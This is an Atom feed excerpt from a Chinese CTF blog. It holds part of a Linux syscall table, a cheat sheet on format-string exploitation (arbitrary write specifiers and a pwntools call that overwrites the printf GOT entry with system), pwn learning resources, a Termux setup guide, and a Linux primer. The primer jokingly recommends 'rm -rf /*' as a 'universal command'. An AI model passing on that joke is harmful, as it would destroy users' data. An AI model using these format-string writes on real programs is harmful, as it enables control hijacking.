*</a></td></tr><tr><td>168</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/poll.2.html" target="_blank" rel="noopener">sys_poll</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/select.c" target="_blank" rel="noopener">fs/select.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pollfd" target="_blank" rel="noopener">struct pollfd *</a></td><td>unsigned int</td><td>long</td><td>-</td><td>-</td></tr><tr><td>169</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/nfsservctl.2.html" target="_blank" rel="noopener">sys_nfsservctl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/filesystems.c" target="_blank" rel="noopener">fs/filesystems.c</a></td><td>int</td><td>void *</td><td>void *</td><td>-</td><td>-</td></tr><tr><td>170</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/setresgid.2.html" target="_blank" rel="noopener">sys_setresgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>171</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/getresgid.2.html" target="_blank" rel="noopener">sys_getresgid</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t *</a></td><td>-</td><td>-</td></tr><tr><td>172</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/prctl.2.html" target="_blank" rel="noopener">sys_prctl</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/sys.c" target="_blank" rel="noopener">kernel/sys.c</a></td><td>int</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td><td>unsigned long</td></tr><tr><td>173</td><td>sys_rt_sigreturn</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/signal.c" target="_blank" rel="noopener">arch/i386/kernel/signal.c</a></td><td>unsigned long</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td>174</td><td>sys_rt_sigaction</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigaction" target="_blank" rel="noopener">const struct sigaction *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigaction" target="_blank" rel="noopener">struct sigaction *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td></tr><tr><td>175</td><td>sys_rt_sigprocmask</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigset_t" target="_blank" rel="noopener">sigset_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigset_t" target="_blank" rel="noopener">sigset_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td></tr><tr><td>176</td><td>sys_rt_sigpending</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigset_t" target="_blank" rel="noopener">sigset_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>177</td><td>sys_rt_sigtimedwait</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigset_t" target="_blank" rel="noopener">const sigset_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#siginfo_t" target="_blank" rel="noopener">siginfo_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#timespec" target="_blank" rel="noopener">const struct timespec *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td></tr><tr><td>178</td><td>sys_rt_sigqueueinfo</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/signal.c" target="_blank" rel="noopener">kernel/signal.c</a></td><td>int</td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#siginfo_t" target="_blank" rel="noopener">siginfo_t *</a></td><td>-</td><td>-</td></tr><tr><td>179</td><td>sys_rt_sigsuspend</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/signal.c" target="_blank" rel="noopener">arch/i386/kernel/signal.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#sigset_t" target="_blank" rel="noopener">sigset_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>180</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/pread.2.html" target="_blank" rel="noopener">sys_pread</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned int</td><td>char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#loff_t" target="_blank" rel="noopener">loff_t</a></td><td>-</td></tr><tr><td>181</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/pread.2.html" target="_blank" rel="noopener">sys_pwrite</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/read_write.c" target="_blank" rel="noopener">fs/read_write.c</a></td><td>unsigned int</td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#loff_t" target="_blank" rel="noopener">loff_t</a></td><td>-</td></tr><tr><td>182</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/chown.2.html" target="_blank" rel="noopener">sys_chown</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/open.c" target="_blank" rel="noopener">fs/open.c</a></td><td>const char *</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#uid_t" target="_blank" rel="noopener">uid_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#gid_t" target="_blank" rel="noopener">gid_t</a></td><td>-</td><td>-</td></tr><tr><td>183</td><td>sys_getcwd</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/fs/dcache.c" target="_blank" rel="noopener">fs/dcache.c</a></td><td>char *</td><td>unsigned long</td><td>-</td><td>-</td><td>-</td></tr><tr><td>184</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/capget.2.html" target="_blank" rel="noopener">sys_capget</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/capability.c" target="_blank" rel="noopener">kernel/capability.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#cap_user_header_t" target="_blank" rel="noopener">cap_user_header_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#cap_user_data_t" target="_blank" rel="noopener">cap_user_data_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>185</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/capget.2.html" target="_blank" rel="noopener">sys_capset</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/kernel/capability.c" target="_blank" rel="noopener">kernel/capability.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#cap_user_header_t" target="_blank" rel="noopener">cap_user_header_t</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#cap_user_data_t" target="_blank" rel="noopener">const cap_user_data_t</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>186</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sigaltstack.2.html" target="_blank" rel="noopener">sys_sigaltstack</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/signal.c" target="_blank" rel="noopener">arch/i386/kernel/signal.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#stack_t" target="_blank" rel="noopener">const stack_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#stack_t" target="_blank" rel="noopener">stack_t *</a></td><td>-</td><td>-</td><td>-</td></tr><tr><td>187</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/sendfile.2.html" target="_blank" rel="noopener">sys_sendfile</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/mm/filemap.c" target="_blank" rel="noopener">mm/filemap.c</a></td><td>int</td><td>int</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#off_t" target="_blank" rel="noopener">off_t *</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#size_t" target="_blank" rel="noopener">size_t</a></td><td>-</td></tr><tr><td>190</td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/man/vfork.2.html" target="_blank" rel="noopener">sys_vfork</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/src/arch/i386/kernel/process.c" target="_blank" rel="noopener">arch/i386/kernel/process.c</a></td><td><a href="https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td><td>-</td><td>-</td><td>-</td><td>-</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;x64-system-call&quot;&gt;&lt;a href=&quot;#x64-system-call&quot; class=&quot;headerlink&quot; title=&quot;x64_system_call:&quot;&gt;&lt;/a&gt;x64_system_call:&lt;/h1&gt;&lt;p&gt;原表位于 : &lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="ctf-pwn" scheme="http://www.zero-mk.github.io/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符漏洞</title>
    <link href="http://www.zero-mk.github.io/2018/12/17/FMT/"/>
    <id>http://www.zero-mk.github.io/2018/12/17/FMT/</id>
    <published>2018-12-17T08:39:34.000Z</published>
    <updated>2018-12-31T18:10:57.419Z</updated>
    
    <content type="html"><![CDATA[<h3 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h3><p>读：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;%&#123;&#125;$x&apos;.format(index)           // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 同上面</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br></pre></td></tr></table></figure><p>写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br></pre></td></tr></table></figure></p><h3 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h3><p>读：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;%&#123;&#125;$x&apos;.format(index, num)      // 读4个字节</span><br><span class="line">&apos;%&#123;&#125;$lx&apos;.format(index, num)     // 读8个字节</span><br><span class="line">&apos;%&#123;&#125;$p&apos;.format(index)           // 读8个字节</span><br><span class="line">&apos;$&#123;&#125;$s&apos;.format(index)</span><br></pre></td></tr></table></figure></p><p>写：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&apos;%&#123;&#125;$n&apos;.format(index)           // 解引用，写入四个字节</span><br><span class="line">&apos;%&#123;&#125;$hn&apos;.format(index)          // 解引用，写入两个字节</span><br><span class="line">&apos;%&#123;&#125;$hhn&apos;.format(index)         // 解引用，写入一个字节</span><br><span class="line">&apos;%&#123;&#125;$lln&apos;.format(index)         // 解引用，写入八个字节</span><br><span class="line">%1$lx: RSI</span><br><span class="line">%2$lx: RDX</span><br><span class="line">%3$lx: RCX</span><br><span class="line">%4$lx: R8</span><br><span class="line">%5$lx: R9</span><br><span class="line">%6$lx: 栈上的第一个QWORD</span><br></pre></td></tr></table></figure></p><h3 id="附加："><a href="#附加：" class="headerlink" title="附加："></a>附加：</h3><p>fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。</p><p>fmtstr_payload有两个参数<br>第一个参数是int，用于表示取参数的偏移个数</p><p>第二个参数是字典，字典的意义是往key的地址，写入value的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(7, &#123;printf_got: system_add&#125;)</span><br></pre></td></tr></table></figure><p>这个函数调用会往printf_got中写入system_add</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;32位：&quot;&gt;&lt;a href=&quot;#32位：&quot; class=&quot;headerlink&quot; title=&quot;32位：&quot;&gt;&lt;/a&gt;32位：&lt;/h3&gt;&lt;p&gt;读：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g
      
    
    </summary>
    
    
      <category term="ctf-pwn" scheme="http://www.zero-mk.github.io/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>记录我学习pwn</title>
    <link href="http://www.zero-mk.github.io/2018/12/15/my-ctf-pwn/"/>
    <id>http://www.zero-mk.github.io/2018/12/15/my-ctf-pwn/</id>
    <published>2018-12-14T16:00:34.000Z</published>
    <updated>2018-12-31T18:13:30.375Z</updated>
    
    <content type="html"><![CDATA[<h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源:"></a>学习资源:</h3><p>CTF wiki : <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/readme/</a>  (教科书)</p><p>C语言-内存管理基础  : <a href="https://www.jianshu.com/p/b2380e47d005" target="_blank" rel="noopener">https://www.jianshu.com/p/b2380e47d005</a>  (不会这个,好像,不用玩pwn了)</p><p>PWN选手的自我修养 :  <a href="https://r00tk1ts.github.io/2017/09/11/PWN%E9%80%89%E6%89%8B%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/" target="_blank" rel="noopener">https://r00tk1ts.github.io/2017/09/11/PWN%E9%80%89%E6%89%8B%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</a></p><p>i春秋的上的Linux pwn入门教程系列 : <a href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><br>Bamboofox :  <a href="https://bamboofox.cs.nctu.edu.tw/" target="_blank" rel="noopener">https://bamboofox.cs.nctu.edu.tw/</a>  (说实话,我的pwn起点就是在这里)</p><p>Bamboofox Official Blog : <a href="https://bamboofox.github.io/" target="_blank" rel="noopener">https://bamboofox.github.io/</a>  (国际赛pwn题wp)</p><h3 id="题目和writeup"><a href="#题目和writeup" class="headerlink" title="题目和writeup:"></a>题目和writeup:</h3><p>pwn_repo : <a href="https://github.com/bash-c/pwn_repo" target="_blank" rel="noopener">https://github.com/bash-c/pwn_repo</a>  (很多pwn题,附加writeup,自己慢慢啃)</p><p>pwn_step_in : <a href="https://github.com/ckxckx/pwn_step_in" target="_blank" rel="noopener">https://github.com/ckxckx/pwn_step_in</a>  (分类,渐进)</p><p>国际赛题目 : <a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a> </p><h3 id="书"><a href="#书" class="headerlink" title="书:"></a>书:</h3><p>程序员的自我修养:链接、装载与库 : <a href="https://www.jb51.net/books/180084.html" target="_blank" rel="noopener">https://www.jb51.net/books/180084.html</a>  (名字很佛系,但是,是真干货,强烈建议买一本)</p><p>glibc内存管理ptmalloc源代码分析.pdf : <a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf" target="_blank" rel="noopener">https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf</a></p><p>IBM的汇编开发指南 : <a href="https://www.ibm.com/developerworks/cn/linux/l-assembly/index.html?mhq=AT%26T%20%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97&amp;mhsrc=ibmsearch_d" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-assembly/index.html?mhq=AT%26T%20%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97&amp;mhsrc=ibmsearch_d</a></p><p>系统调用表 : 我博客搜索syscall或Linux_System_Call_Table</p><p>系统调用解释 : <a href="https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html#3" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/kernel/syscall/part1/appendix.html#3</a></p><h3 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h3><p>使用docker部署的解题环境 : <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a>  (基于<a href="https://github.com/phusion/baseimage-docker" target="_blank" rel="noopener">https://github.com/phusion/baseimage-docker</a>)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;学习资源&quot;&gt;&lt;a href=&quot;#学习资源&quot; class=&quot;headerlink&quot; title=&quot;学习资源:&quot;&gt;&lt;/a&gt;学习资源:&lt;/h3&gt;&lt;p&gt;CTF wiki : &lt;a href=&quot;https://ctf-wiki.github.io/ctf-wiki/pwn/
      
    
    </summary>
    
    
      <category term="ctf-pwn" scheme="http://www.zero-mk.github.io/tags/ctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>termux</title>
    <link href="http://www.zero-mk.github.io/2018/10/01/termux/"/>
    <id>http://www.zero-mk.github.io/2018/10/01/termux/</id>
    <published>2018-10-01T01:41:55.000Z</published>
    <updated>2018-12-31T17:01:54.287Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-准备操作"><a href="#0x1-准备操作" class="headerlink" title="0x1.准备操作"></a>0x1.准备操作</h2><p>下载termux<a href="https://www.coolapk.com/apk/com.termux" target="_blank" rel="noopener">点击这里</a><br>安装，打开，等初始化完成(建议挂梯子)初始化完成了会进入一个终端</p><h2 id="0x2-更新软件包"><a href="#0x2-更新软件包" class="headerlink" title="0x2.更新软件包"></a>0x2.更新软件包</h2><p>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg update &amp;&amp; pkg upgrade</span><br></pre></td></tr></table></figure><p>回车，等完成</p><h2 id="0x3-安装vim和gcc"><a href="#0x3-安装vim和gcc" class="headerlink" title="0x3.安装vim和gcc"></a>0x3.安装vim和gcc</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install vim clang</span><br></pre></td></tr></table></figure><p>回车</p><h2 id="0x4-Done"><a href="#0x4-Done" class="headerlink" title="0x4.Done"></a>0x4.Done</h2><p>完成，这时你需要了解几个Linux命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> abc <span class="comment">#打开abc文件夹</span></span><br><span class="line">ls <span class="comment">#列出当前文件夹内的文件和文件夹</span></span><br><span class="line">mkdir abc <span class="comment">#创建一个名为abc的文件夹</span></span><br><span class="line">touch abc <span class="comment">#创建一个名为abc的文件</span></span><br><span class="line">vim t.c <span class="comment">#使用vim编辑t.c文件(如果t.c不存在会被创建)</span></span><br><span class="line">gcc t.c <span class="comment">#使用gcc编译t.c文件(编译后的文件为当前目录下的a.out)</span></span><br><span class="line">gcc t.c -o xxx <span class="comment">#使用gcc编译t.c文件  -o xxx 指定编译输出的文件为xxx</span></span><br></pre></td></tr></table></figure><p>关于vim的基本操作参见<a href="https://www.jianshu.com/p/5af00815b4e4" target="_blank" rel="noopener">点击这里</a></p><p>其实termux就是个小型的Linux,玩法很多,自己去看看 <a href="https://wiki.termux.com/wiki/Main_Page" target="_blank" rel="noopener">termux wiki</a></p><p>=====================================================</p><h2 id="如果看不懂上面的文字描述看一下下面这个终端录像，因为我是用vps，录的时候网有点卡，所以凑合着看吧"><a href="#如果看不懂上面的文字描述看一下下面这个终端录像，因为我是用vps，录的时候网有点卡，所以凑合着看吧" class="headerlink" title="如果看不懂上面的文字描述看一下下面这个终端录像，因为我是用vps，录的时候网有点卡，所以凑合着看吧"></a>如果看不懂上面的文字描述看一下下面这个终端录像，因为我是用vps，录的时候网有点卡，所以凑合着看吧</h2><p>[<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://asciinema.org/a/W17izXEr2krrzTiY9x9xJTwMc" alt="asciicast](https://asciinema.org/a/W17izXEr2krrzTiY9x9xJTwMc.png)" title="">                </div>                <div class="image-caption">asciicast](https://asciinema.org/a/W17izXEr2krrzTiY9x9xJTwMc.png)</div>            </figure></p><p>=====================================================</p><p>关于termux下运行Ubuntu,有个工具可以实现，项目地址:<a href="https://github.com/YadominJinta/atilo" target="_blank" rel="noopener">atilo</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pkg update &amp;&amp; pkg upgrade</span><br><span class="line"></span><br><span class="line">pkg install git curl</span><br><span class="line"></span><br><span class="line">curl https://raw.githubusercontent.com/YadominJinta/atilo/master/atilo -o ~/atilo</span><br><span class="line"></span><br><span class="line">chmod +x atilo</span><br><span class="line"></span><br><span class="line">./atilo install ubuntu</span><br></pre></td></tr></table></figure><p>把上面的按句复制粘贴到termux中执行如果一切顺利执行完后输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startubuntu</span><br></pre></td></tr></table></figure></p><p>就可以启动ubuntu了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x1-准备操作&quot;&gt;&lt;a href=&quot;#0x1-准备操作&quot; class=&quot;headerlink&quot; title=&quot;0x1.准备操作&quot;&gt;&lt;/a&gt;0x1.准备操作&lt;/h2&gt;&lt;p&gt;下载termux&lt;a href=&quot;https://www.coolapk.com/apk/c
      
    
    </summary>
    
    
      <category term="termux" scheme="http://www.zero-mk.github.io/tags/termux/"/>
    
  </entry>
  
  <entry>
    <title>Linux</title>
    <link href="http://www.zero-mk.github.io/2018/09/28/Linux/"/>
    <id>http://www.zero-mk.github.io/2018/09/28/Linux/</id>
    <published>2018-09-28T13:39:34.000Z</published>
    <updated>2018-12-31T17:02:18.706Z</updated>
    
    <content type="html"><![CDATA[<p>关于Linux，说实话我也只是个小白<br>混过许多群，我经常见到一些纯白想着直接用kali成大牛，但一点Linux的基础都没有，连ls,cd都不会你怎么玩?</p><p>我常看的有:</p><p>Linux中国:<a href="https://linux.cn/" target="_blank" rel="noopener">https://linux.cn/</a></p><p>先把 <a href="https://linux.cn/article-6160-1.html" target="_blank" rel="noopener">Linux 新手应该知道的 26 个命令-技术 </a>给记好，不然你连基本操作都不会玩个鬼的kali，问问题前自已先百度，还是解决不了的,问别人的时候说出你的问题和你的解决方法,这是问别人问题的方法:<a href="https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md" target="_blank" rel="noopener">提问的智慧</a></p><p>学Linux我不建议是先把所有的命令记下来才开始用,边学边练才是正确的方法,至于该去哪里找环境</p><p>安卓手机:我博客有一篇关于termux的文章</p><p>电脑:百度搜:安装Ubuntu虚拟机</p><p>在线环境:</p><p>实验楼:<a href="https://www.shiyanlou.com/courses/?course_type=all&amp;tag=Linux" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/?course_type=all&amp;tag=Linux</a></p><p>还有这个:<a href="https://bellard.org/jslinux/" target="_blank" rel="noopener">https://bellard.org/jslinux/</a></p><p>如果你连看基础命令都没有耐心，那么我教你一个万能命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /*</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;关于Linux，说实话我也只是个小白&lt;br&gt;混过许多群，我经常见到一些纯白想着直接用kali成大牛，但一点Linux的基础都没有，连ls,cd都不会你怎么玩?&lt;/p&gt;
&lt;p&gt;我常看的有:&lt;/p&gt;
&lt;p&gt;Linux中国:&lt;a href=&quot;https://linux.cn/&quot; 
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://www.zero-mk.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>TorMetal2018</title>
    <link href="http://www.zero-mk.github.io/2018/07/29/TorMetal2018/"/>
    <id>http://www.zero-mk.github.io/2018/07/29/TorMetal2018/</id>
    <published>2018-07-29T13:39:34.000Z</published>
    <updated>2018-07-30T12:28:44.000Z</updated>
    
